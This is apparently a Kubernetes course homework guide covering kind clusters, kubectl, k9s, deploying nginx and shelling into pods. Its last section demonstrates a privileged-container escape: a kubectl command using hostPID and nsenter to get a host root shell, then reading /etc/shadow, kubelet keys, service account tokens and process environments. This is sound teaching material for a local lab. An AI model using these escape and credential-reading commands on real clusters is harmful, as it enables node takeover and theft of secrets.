# Homework 1

## What is Kubernetes?

Kubernetes, also known as K8s, is an open-source system designed to automate the deployment, scaling, and management of containerized applications. It functions as a container orchestration platform, unifying a cluster of machines into a single pool of compute resources. In modern software development, applications are often broken down into smaller, independent components called microservices, which are then packaged into lightweight, portable units called containers. While containers solve the problem of packaging an application and its dependencies, managing thousands of these containers across a fleet of servers presents significant operational challenges.

K8s provides a framework for making sure containerized applications run where and when you want them to, and helps them find the resources and tools they need to work together. It automates the entire application lifecycle through a powerful set of features:

- **Self-Healing**: If a container or the node it's running on fails, K8s can automatically restart or replace it to ensure the application remains available.   

- **Horizontal Scaling**: It can automatically scale the number of running containers up or down based on metrics like CPU usage.  

- **Service Discovery and Load Balancing**: K8s gives a set of containers a single, stable DNS name and can distribute network traffic across them, enabling reliable communication between microservices.

- **Configuration and Secret Management**: It allows you to deploy and update sensitive information like passwords and application configurations without rebuilding container images.

---

## What is a Kubernetes Cluster?

A Kubernetes cluster is a collection of machines (called `nodes`) that work together to run containerized applications. It consists of two main components:
- **Control Plane (Master Nodes)**: The brain of the cluster that manages all orchestration tasks (e.g., scheduling).
- **Data Plane (Worker Nodes)**: The machines that actually run your applications in containers.

This decoupling enhances the system's stability, scalability, and security. The Control Plane can manage the cluster without being directly affected by the resource consumption of the applications, and vice versa. In production environments, the control plane typically runs across multiple computers, and clusters usually have multiple nodes to provide fault-tolerance and high availability.

**Kubernetes IN Docker (`kind`)** is a tool for running local Kubernetes clusters using Docker container nodes. Each K8s cluster node, control-plane and worker, is itself a Docker container running on the local machine.

### Create a Cluster Using Kind

1. Look at the cluster configuration in the [ccs-cluster.yaml](./01_create_cluster/ccs-cluster.yaml) file. [You can learn about cluster configurations here](https://kind.sigs.k8s.io/docs/user/configuration/).

2. Create the cluster using the `kind` command.

    ```bash
    kind create cluster --config ./01_create_cluster/ccs-cluster.yaml --name ccs-cluster
    ```

> **Recommendation:** 
> If you pulled all the [images](../../images.txt), once your kubernetes `ccs-cluster` is up and running you can push all the images in your local registry to the cluster
> 
> ```bash
> # push all images to your kind cluster
> for image in $(cat ../../images.txt); do kind load docker-image $image --name ccs-cluster; done;
> ```
> pushing all images at once is a resource-consuming (time, storage, and compute) process. You may choose to push images as required. In the following command, replace `<image>` with the actual name of the required image from the [list](./images.txt).
>
> ```bash
> kind load docker-image <image> --name ccs-cluster
> ```
>


---

## The `~/.kube/config` File

A kubeconfig file is a YAML file that contains all the information needed to access and authenticate with a Kubernetes cluster. It stores cluster details, user credentials, authentication mechanisms, and context information that kubectl and other Kubernetes clients use to communicate with the cluster's API server.

A kubeconfig file typically contains:
- **Clusters**: Information about Kubernetes clusters (API server addresses, certificates).
- **Users**: Authentication credentials (certificates, tokens, username/password). A user can be a human operator or a service account.
- **Contexts**: Combinations of cluster, user, and namespace information. It enables an operator to define distinct profiles for accessing different clusters with different user identities.

---

## The `kubectl` tool

kubectl (kube-control) is the official command-line tool for interacting with Kubernetes clusters. It communicates with the Kubernetes API server to perform operations on cluster resources such as creating, reading, updating, and deleting Kubernetes objects.

[You can learn more about the tool here](https://kubernetes.io/docs/reference/kubectl/) or by using the following command in a terminal:

```bash
kubectl help
```

---

## The `k9s` Tool

`k9s` is a terminal-based user interface that provides a dashboard-like experience to interact with Kubernetes clusters. It offers a experience in the terminal, allowing users to navigate, observe, and manage Kubernetes resources. It continuously watches for changes to resources and presents them in a dynamic, filterable, and navigable interface.

[You can learn more about the tool here](https://k9scli.io/) or by using the following command in a terminal:

```bash
k9s help
```

---

## Kubernetes Workload

Kubernetes workloads are applications running on Kubernetes clusters. A workload consists of one or more pods that work together to provide specific functionality. Rather than managing individual pods directly, you create a workload resource and its corresponding controller creates and manages the required Pods on your behalf. Workloads use higher-level abstractions called workload resources that automatically manage pods according to specified rules and requirements.

### Deploy Workload

#### Using Multiple Kubectl Commands

1. Run the following commands

    ```bash
    # create nginx deployment
    kubectl create deployment nginx --image=nginx:stable-alpine3.17-slim --replicas=2 --port=80
    # create service (nginx by default will run in port 80)
    kubectl create service clusterip nginx --tcp=8080:80
    # locally expose nginx service using port 8080
    kubectl port-forward svc/nginx 8080:8080
    ```

2. Open any browser and go to <http://localhost:8080/>
3. Explore deployed application using `kubectl` or `k9s`
4. Terminate nginx application

    ```bash
    kubectl delete svc nginx
    kubectl delete deployment nginx
    ```

#### Using Yaml Files (Alternate Method)

1. Explore the [nginx.yaml](./02_deploy_workload/nginx.yaml) file.
2. Run the following commands

    ```bash
    # create nginx deployment and service (nginx by default will run in port 80)
    kubectl apply -f 02_deploy_workload/nginx.yaml
    # locally expose nginx service using port 8080
    kubectl port-forward svc/nginx 8080:8080
    ```

3. Open browser and go to <http://localhost:8080/>
4. Explore deployed application using `kubectl` or `k9s`
    - Pods
    - Deployments
    - Services
5. Terminate nginx application

    ```bash
    kubectl delete -f 02_deploy_workload/nginx.yaml
    ```


[You can learn more about running applications (deploying workloads) here.](https://kubernetes.io/docs/tasks/run-application/)

---

## Get a Shell into a Running Container

Getting a shell to a container allows direct interaction with the container's environment. This is accomplished using the `kubectl exec` command, which executes commands (including shell sessions) inside containers running in Kubernetes pods.

1. Explore the [busybox.yaml](./03_get_shell/busybox.yaml) file.
2. Deploy busybox as a pod (notice we are not creating a `deployment` this time)

    ```bash
    # create busybox pod
    kubectl apply -f 03_get_shell/busybox.yaml
    ```

3. Exec into the running container

    - Using `kubectl`

        ```bash
        kubectl exec -it pod/busybox -- sh
        ```

    - Using `k9s` (Alternate Method)

        ```bash
        k9s
        ```
        - Navigate to Pods `>` busybox `>` press `<s>`.

4. Explore the container file system
    - `top` command
    - `ls` (/proc, /sys, /dev, /etc) command
    - `printenv`
5. Terminate busybox pod

    ```bash
    kubectl delete -f 03_get_shell/busybox.yaml
    ```

[You can learn more about getting a shell into a running container here.](https://kubernetes.io/docs/tasks/debug/debug-application/get-shell-running-container/)

---

## Privileged Containers

A privileged container is a container that has been granted nearly unrestricted access to the underlying host machine's resources and kernel capabilities. This elevated access effectively bypasses the standard isolation and security boundaries that containerization technologies are designed to enforce

Potential uses of a privileged container:

- Providing applications with direct access to hardware resources (e.g., GPU or storage).
- Application may need to perform kernel-level operations (e.g., modifying kernel variables).
- Docker in Docker (DinD) applications
- Some security and monitoring tools might need such access to collect metrics, and enforce security policies.

### Empty Privileged Containers

These privileged containers do not have a pre-defined application or command to run upon startup. Instead, they typically provides an interactive shell. Such containers offer admins with direct root-level access into the host OS. This functionality enables a cluster admin to perform node-/host- level troubleshooting.

#### Deploy and Use an Empty Privileged Container

Deploy the container:

```bash
kubectl run r00t --restart=Never -ti --rm --image lol --overrides '{"spec":{"hostPID": true, "containers":[{"name":"1","image":"alpine","command":["nsenter","--mount=/proc/1/ns/mnt","--ipc=/proc/1/ns/ipc","--net=/proc/1/ns/net","--uts=/proc/1/ns/uts","--","/bin/bash"],"stdin": true,"tty":true,"securityContext":{"privileged":true}}]}}'
```

##### File System Isolation Breakout

***Read any file present on the host node's filesystem.***

1. Inspect sensitive files and folders on the compromised node:

    ```bash
    # Contains the hashed passwords for all users on the system
    cat /etc/passwd
    cat /etc/shadow
    # Similar to /etc/shadow, but for group account passwords
    cat /etc/gdshadow

    # Defines privileges for users and groups regarding the use of sudo
    cat /etc/sudoers
    ls /etc/sudoers.d/

    # The home directory of the root user
    ls /root
    # The home folders of all users in the system
    ls /home
    ```

2. Identify in which node the privilege container is currently running:

    ```bash
    # node name would usually be on the /etc/hosts file
    cat /etc/hosts
    # node name would be passed via the --hostname-override flag in kube-proxy 
    ps -aux | grep "kube-proxy"
    ```

3. Inspect interesting files and folders that belong to the kubelet process:

    ```bash
    # kubelet configuration
    cat /var/lib/kubelet/config.yaml
    # kubelet client and server tls keys
    ls -lhra /var/lib/kubelet/pki
    # list pods managed by kubelet
    ls -lhra /var/lib/kubelet/pods
    ```

4. Inspect the running containers virtual file systems under the io.containerd.snapshotter.v1.overlayfs folder:

    ```bash
    ls -lhra /var/lib/containerd/io.containerd.snapshotter.v1.overlayfs
    ```

5. Inspect the mounted volumes and secrets for a particular pod:

    ```bash
    # list mounted volumes
    # Replace $PODID with the UUID of the pod.
    ls -lhra /var/lib/kubelet/pods/$PODID/volumes

    # display the service account token
    # Replace $value with the actual value as present in the filesystem.
    # You can use <TAB> key to auto-fill.
    cat /var/lib/kubelet/pods/$PODID/volumes/kubernetes.io~projected/kube-api-access-$value/token
    ```

6. Inspect the logs for a particular container:

    ```bash
    # list log files for all containers
    ls -lhar /var/log/containers
    # display logs for a particular container, where $CONTAINERID is the filename:
    cat /var/log/containers/{$CONTAINERID}.log
    ```

##### Processes Isolation Breakout

***Inspect all running processes on the host node.***

1. Run the `top` or `ps -aux` commands and look for interesting processes such as `kubelet`, `containerd` and `systemd`.

2. Inspect the environment variables for those privileged processes using the cat command:

    ```bash
    # `$PID` is the ID of the `kubelet`, `containerd` or `systemd` processes
    cat /proc/$PID/environ
    ```

    Example output:

    ```bash
    # ie: cat /proc/226/environ
    HTTPS_PROXY=HTTP_PROXY=LANG=C.UTF-8NO_PROXY=PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/binINVOCATION_ID=02399a2f43db446f8ceff7754cc8b499JOURNAL_STREAM=9:55296SYSTEMD_EXEC_PID=226KUBELET_KUBECONFIG_ARGS=--bootstrap-kubeconfig=/etc/kubernetes/bootstrap-kubelet.conf --kubeconfig=/etc/kubernetes/kubelet.confKUBELET_CONFIG_ARGS=--config=/var/lib/kubelet/config.yamlKUBELET_KUBEADM_ARGS=--container-runtime-endpoint=unix:///run/containerd/containerd.sock --node-ip=172.18.0.3 --node-labels= --pod-infra-container-image=registry.k8s.io/pause:3.9 --provider-id=kind://docker/ccs-cluster/ccs-cluster-worker2KUBELET_EXTRA_ARGS=--runtime-cgroups=/system.slice/containerd.service
    ```

    From the above configuration identify the `Node IP` and the `kubelet.conf` configuration file

##### Network Isolation Breakout

***Inspect all network activity***

1. Run the ss command to list all current listening sockets and network information for the compromised node:

    ```bash
    ss -nltp
    ```

    Example output:

    ```bash
    State  Recv-Q Send-Q Local Address:Port  Peer Address:PortProcess
    LISTEN 0      4096      127.0.0.11:38803      0.0.0.0:*
    LISTEN 0      4096       127.0.0.1:41225      0.0.0.0:*    users:(("containerd",pid=105,fd=10))
    LISTEN 0      4096       127.0.0.1:10248      0.0.0.0:*    users:(("kubelet",pid=234,fd=17))
    LISTEN 0      4096       127.0.0.1:10249      0.0.0.0:*    users:(("kube-proxy",pid=384,fd=11))
    LISTEN 0      4096               *:10250            *:*    users:(("kubelet",pid=234,fd=25))
    LISTEN 0      4096               *:10256            *:*    users:(("kube-proxy",pid=384,fd=8))
    ```

    Type `exit` to exit the privileged container.

> **Caution**
> Be very cautious when dealing with privileged containers as it can render (almost) all security protections useless.

[You can learn more about privileged containers here.](https://medium.com/@mughal.asim/kubernetes-security-contexts-managing-privileged-mode-risks-considerations-c36620b62d3c)